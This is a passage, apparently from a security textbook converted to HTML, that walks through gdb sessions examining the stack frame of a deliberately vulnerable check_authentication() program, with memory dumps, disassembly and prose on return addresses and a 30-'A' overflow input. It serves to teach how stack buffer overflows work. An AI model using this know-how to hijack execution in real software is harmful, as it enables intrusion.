style="width:68pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:65pt"><p class="s42" style="padding-left: 10pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000001</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:10pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff810:</p></td><td style="width:69pt"><p class="s42" style="padding-right: 12pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb8000ce0</p></td><td style="width:65pt"><p class="s42" style="padding-left: 10pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff848</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbffff7e0 - 0xbffff7a0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 64</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s password_buffer</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;line-height: 92%;text-align: left;">0xbffff7c0:   &quot;?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\ bH???????\002&quot;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/x &amp;auth_flag 0xbffff7bc:   0x00000000 (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_363.png"/></span></p><p style="padding-top: 5pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">Continuing to the second breakpoint in <span class="s31">check_authentication()</span>, a stack frame (shown in bold) is pushed onto the stack when the function is called. Since the stack grows upward toward lower memory addresses, the stack pointer is now 64 bytes less at <span class="s31">0xbffff7a0</span>. The size and structure of a stack frame can vary greatly, depending on the function and certain compiler optimizations. For example, the first 24 bytes of this stack frame are just padding put there by the compiler. The local stack variables, <span class="s31">auth_flag </span>and <span class="s31">password_buffer</span>, are shown at their respective memory locations in the stack frame. The <span class="s31">auth_flag </span>(<span class="s53">0</span>) is shown at <span class="s31">0xbffff7bc</span>, and the 16 bytes of the password buffer (<span class="s53">@</span>) are shown at <span class="s31">0xbffff7c0</span>.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The stack frame contains more than just the local variables and pad- ding. Elements of the <span class="s31">check_authentication() </span>stack frame are shown below.</p><p style="padding-left: 91pt;text-indent: 18pt;text-align: left;">First, the memory saved for the local variables is shown in italic. This starts at the <span class="s31">auth_flag </span>variable at <span class="s31">0xbffff7bc </span>and continues through the end of the 16-byte <span class="s31">password_buffer </span>variable. The next few values on the stack are just padding the compiler threw in, plus something called the <span class="s27">saved frame pointer</span>. If the program is compiled with the flag <span class="s31">-fomit-frame-pointer </span>for optimiza- tion, the frame pointer wonâ€™t be used in the stack frame. At <span class="s62">@ </span>the value <span class="s31">0x080484bb </span>is the return address of the stack frame, and at <span class="s62">O </span>the address <span class="s31">0xbffffe9b7 </span>is a pointer to a string containing 30 <span class="s27">A</span>s. This must be the argu- ment to the <span class="s31">check_authentication() </span>function.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_364.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/32xw $esp</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7a0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049744</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7b8</p></td><td style="width:58pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x080482d9</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7b0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xb7f9f729</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7e8</p></td><td style="width:58pt"><p class="s44" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x00000000</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7c0:</p></td><td style="width:66pt"><p class="s44" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s44" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff880</p></td><td style="width:68pt"><p class="s44" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e8</p></td><td style="width:58pt"><p class="s44" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7fd6ff4</p></td></tr></table><table style="border-collapse:collapse;margin-left:16.9376pt" cellspacing="0"><tr style="height:10pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7d0:</p></td><td style="width:74pt" colspan="2"><p class="s45" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7ff47b0</p></td><td style="width:67pt" colspan="2"><p class="s45" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:65pt" colspan="2"><p class="s45" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e8</p></td><td style="width:66pt" colspan="2"><p class="s61" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">8<span class="s45">0x080484bb</span></p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e0:</p></td><td style="width:74pt" colspan="2"><p class="s61" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0<span class="s42">0xbffff9b7</span></p></td><td style="width:67pt" colspan="2"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:65pt" colspan="2"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td><td style="width:66pt" colspan="2"><p class="s42" style="padding-left: 11pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7eafebc</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7f0:</p></td><td style="width:74pt" colspan="2"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000002</p></td><td style="width:67pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:65pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff880</p></td><td style="width:66pt" colspan="2"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb8001898</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff800:</p></td><td style="width:74pt" colspan="2"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:67pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:65pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:66pt" colspan="2"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td></tr><tr style="height:10pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff810:</p></td><td style="width:74pt" colspan="2"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:67pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb8000ce0</p></td><td style="width:65pt" colspan="2"><p class="s42" style="padding-left: 9pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:66pt" colspan="2"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td></tr><tr style="height:22pt"><td style="width:56pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">(gdb) x/32xb</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9b7:</p></td><td style="width:40pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: center;">0xbffff9b7</p><p class="s42" style="padding-left: 13pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41</p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41</p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41</p></td><td style="width:33pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41</p></td><td style="width:35pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41</p></td><td style="width:30pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x41</p></td><td style="width:38pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x41</p></td><td style="width:28pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x41</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff9bf:</p></td><td style="width:40pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:33pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:35pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:30pt"><p class="s42" style="padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:38pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff9c7:</p></td><td style="width:40pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:33pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:35pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:30pt"><p class="s42" style="padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:38pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td></tr><tr style="height:10pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff9cf:</p></td><td style="width:40pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:34pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:33pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:35pt"><p class="s42" style="padding-left: 8pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41</p></td><td style="width:30pt"><p class="s42" style="padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41</p></td><td style="width:38pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x53</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s 0xbffff9b7</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff9b7:   &#39;A&#39; &lt;repeats 30 times&gt; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_365.png"/></span></p><p style="padding-top: 5pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The return address in a stack frame can be located by understanding how the stack frame is created. This process begins in the <span class="s31">main() </span>function, even before the function call.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_366.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) disass main</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function main:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x08048474 &lt;main+0&gt;:  push  ebp 0x08048475 &lt;main+1&gt;:  mov  ebp,esp 0x08048477 &lt;main+3&gt;:  sub  esp,0x8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x0804847a &lt;main+6&gt;:  and  esp,0xfffffff0 0x0804847d &lt;main+9&gt;:  mov  eax,0x0 0x08048482 &lt;main+14&gt;:  sub  esp,eax</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x08048484 &lt;main+16&gt;:  cmp  DWORD PTR [ebp+8],0x1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x08048488 &lt;main+20&gt;:  jg  0x80484ab &lt;main+55&gt; 0x0804848a &lt;main+22&gt;:  mov  eax,DWORD PTR [ebp+12] 0x0804848d &lt;main+25&gt;:  mov  eax,DWORD PTR [eax] 0x0804848f &lt;main+27&gt;:  mov  DWORD PTR [esp+4],eax 0x08048493 &lt;main+31&gt;:  mov  DWORD PTR [esp],0x80485e5</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x0804849a &lt;main+38&gt;:  call  0x804831c &lt;printf@plt&gt; 0x0804849f &lt;main+43&gt;:  mov  DWORD PTR [esp],0x0 0x080484a6 &lt;main+50&gt;:  call  0x804833c &lt;exit@plt&gt; 0x080484ab &lt;main+55&gt;:  mov  eax,DWORD PTR [ebp+12] 0x080484ae &lt;main+58&gt;:  add  eax,0x4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;"><a name="bookmark61">0x080484b1 &lt;main+61&gt;:  mov  eax,DWORD PTR [eax]</a></p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484b3 &lt;main+63&gt;:  mov  DWORD PTR [esp],eax</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484b6 &lt;main+66&gt;:  call  0x8048414 &lt;check_authentication&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484bb &lt;main+71&gt;:  test  eax,eax</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484bd &lt;main+73&gt;:  je   0x80484e5 &lt;main+113&gt; 0x080484bf &lt;main+75&gt;:  mov  DWORD PTR [esp],0x80485fb 0x080484c6 &lt;main+82&gt;:  call  0x804831c &lt;printf@plt&gt; 0x080484cb &lt;main+87&gt;:  mov  DWORD PTR [esp],0x8048619 0x080484d2 &lt;main+94&gt;:  call  0x804831c &lt;printf@plt&gt; 0x080484d7 &lt;main+99&gt;:  mov  DWORD PTR [esp],0x8048630</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484de &lt;main+106&gt;: call  0x804831c &lt;printf@plt&gt; 0x080484e3 &lt;main+111&gt;: jmp  0x80484f1 &lt;main+125&gt; 0x080484e5 &lt;main+113&gt;: mov  DWORD PTR [esp],0x804864d</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484ec &lt;main+120&gt;: call  0x804831c &lt;printf@plt&gt; 0x080484f1 &lt;main+125&gt;: leave</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080484f2 &lt;main+126&gt;: ret End of assembler dump. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_367.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;"><a href="part55.htm#bookmark61" class="a">Notice the two lines shown in bold on page </a>131. At this point, the EAX register contains a pointer to the first command-line argument. This is also the argument to <span class="s31">check_authentication()</span>. This first assembly instruction writes EAX to where ESP is pointing (the top of the stack). This starts the stack frame for <span class="s31">check_authentication() </span>with the function argument. The second instruction is the actual call. This instruction pushes the address of the next instruction to the stack and moves the execution pointer register (EIP) to the start of the <span class="s31">check_authentication() </span>function. The address pushed to the stack is the return address for the stack frame. In this case, the address of the next instruction is <span class="s31">0x080484bb</span>, so that is the return address.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_368.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) disass check_authentication</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function check_authentication:</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:37pt"><td style="width:163pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048414 &lt;check_authentication+0&gt;:</p><p class="s45" style="text-indent: 0pt;text-align: left;">0x08048415 &lt;check_authentication+1&gt;: 0x08048417 &lt;check_authentication+3&gt;:</p></td><td style="width:32pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p><p class="s45" style="padding-left: 6pt;padding-right: 3pt;text-indent: 0pt;text-align: left;">mov sub</p></td><td style="width:210pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p><p class="s45" style="padding-left: 4pt;padding-right: 143pt;text-indent: 0pt;text-align: left;">ebp,esp esp,0x38</p></td></tr><tr style="height:21pt"><td style="width:163pt"><p class="s42" style="padding-top: 5pt;text-indent: 0pt;text-align: left;">...</p></td><td style="width:32pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:210pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:93pt"><td style="width:163pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-top: 4pt;padding-right: 6pt;text-indent: 0pt;line-height: 107%;text-align: justify;">0x08048472 &lt;check_authentication+94&gt;: 0x08048473 &lt;check_authentication+95&gt;: End of assembler dump.</p><p class="s42" style="text-indent: 0pt;text-align: left;">(gdb) p 0x38</p><p class="s42" style="text-indent: 0pt;text-align: left;">$3 = 56</p><p class="s42" style="text-indent: 0pt;text-align: left;">(gdb) p 0x38 + 4 + 4</p><p class="s42" style="text-indent: 0pt;text-align: left;">$4 = 64</p><p class="s42" style="text-indent: 0pt;text-align: left;">(gdb)</p></td><td style="width:32pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;line-height: 107%;text-align: left;">leave ret</p></td><td style="width:210pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Execution will continue into the <span class="s31">check_authentication() </span>function as EIP is changed, and the first few instructions (shown in bold above) finish saving memory for the stack frame. These instructions are known as the function prologue. The first two instructions are for the saved frame pointer, and the third instruction subtracts <span class="s31">0x38 </span>from ESP. This saves 56 bytes for the local variables of the function. The return address and the saved frame pointer are already pushed to the stack and account for the additional 8 bytes of the 64-byte stack frame.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">When the function finishes, the <span class="s31">leave </span>and <span class="s31">ret </span>instructions remove the stack frame and set the execution pointer register (EIP) to the saved return address in the stack frame (<span class="s63">0</span>). This brings the program execution back to the next instruction in <span class="s31">main() </span>after the function call at <span class="s31">0x080484bb</span>. This process happens every time a function is called in any program.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_369.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/32xw $esp</p><table style="border-collapse:collapse;margin-left:16.9376pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7a0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049744</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7b8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x080482d9</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7b0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7f9f729</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:64pt"><p class="s45" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7c0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff880</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xb7fd6ff4</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7d0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xb7ff47b0</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048510</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s61" style="padding-right: 3pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0<span class="s45">0x080484bb</span></p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7e0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff9b7</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048510</p></td><td style="width:64pt"><p class="s42" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff848</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xb7eafebc</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7f0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff880</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb8001898</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff800:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000001</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000001</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x00000000</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff810:</p></td><td 